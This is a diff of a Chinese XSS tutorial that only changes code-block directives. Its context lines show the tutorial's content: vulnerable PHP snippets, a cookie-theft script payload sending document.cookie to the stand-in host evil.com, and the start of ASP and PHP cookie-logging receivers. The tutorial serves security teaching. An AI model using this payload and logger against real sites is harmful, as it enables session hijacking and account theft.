@@ -16,7 +16,7 @@ Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。
 
 服务器端代码：
 
-.. code:: php
+.. code-block:: php
 
     <?php 
     // Is there any input? 
@@ -37,7 +37,7 @@ Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。
 
 服务器端代码：
 
-.. code:: php
+.. code-block:: php
 
     <?php
       if( isset( $_POST[ 'btnSign' ] ) ) {
@@ -64,7 +64,7 @@ DOM XSS
 
 HTML 代码：
 
-.. code:: html
+.. code-block:: html
 
     <html>
       <head>
@@ -94,7 +94,7 @@ Cookies 窃取
 
 攻击者可以使用以下代码获取客户端的 Cookies 信息：
 
-.. code:: html
+.. code-block:: html
 
     <script>
     document.location="http://www.evil.com/cookie.asp?cookie="+document.cookie
@@ -104,7 +104,7 @@ Cookies 窃取
 
 在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下：
 
-.. code:: asp
+.. code-block:: asp
 
     <%
       msg=Request.ServerVariables("QUERY_STRING")
@@ -116,7 +116,7 @@ Cookies 窃取
       set fs=nothing
     %>
 
-.. code:: php
+.. code-block:: php
 
     <?php
     $cookie = $_GET['cookie'];
